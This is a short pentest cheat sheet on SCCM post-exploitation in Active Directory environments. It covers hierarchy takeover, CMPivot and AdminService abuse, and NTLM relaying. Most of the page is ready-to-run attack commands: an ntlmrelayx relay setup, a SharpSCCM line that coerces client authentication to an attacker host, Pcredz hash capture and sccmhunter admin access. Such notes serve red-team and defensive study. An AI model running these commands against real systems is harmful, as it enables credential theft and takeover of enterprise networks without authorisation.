# Post-exploitation

Compromising a SCCM is a good way to move laterally through VLAN or Forest or compromise an AD tiering model. 

With admin privileges on the primary site server, it is possible to: 
- Deploy arbitrary components on managed machines.
- Relaying authentication
- Use the service **CMPivot** of the Management Point to execute remote actions on hosts (it used **AdminService API** hosted by the SMS Provider server). 

Moreover, if you promote a user with admin privilege on a primary site, it will be promote on others primary site by the CAS (default behavior). This is called **SCCM Hierarchy Takeover**.


## Relaying authentication
Setup NTLM relay
```txt
ntlmrelayx.py -smb2support -socks -ts -ip [IP host interface] -t [IP target]
```
Coerce:
```txt
SharpSCCM.exe exec -rid <TargetResourceID> -r <AttackerHost>
```
Use Pcredz to get NTLMv2, even if NTLM auth failed
```txt
Pcredz -i [interface] -t
```
## AdminService API
```txt
sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "site_server_IP"
```
To write CMPivot requests: https://learn.microsoft.com/fr-fr/mem/configmgr/core/servers/manage/cmpivot

## More information
https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087
https://www.thehacker.recipes/a-d/movement/sccm-mecm/post-exploitation
https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867
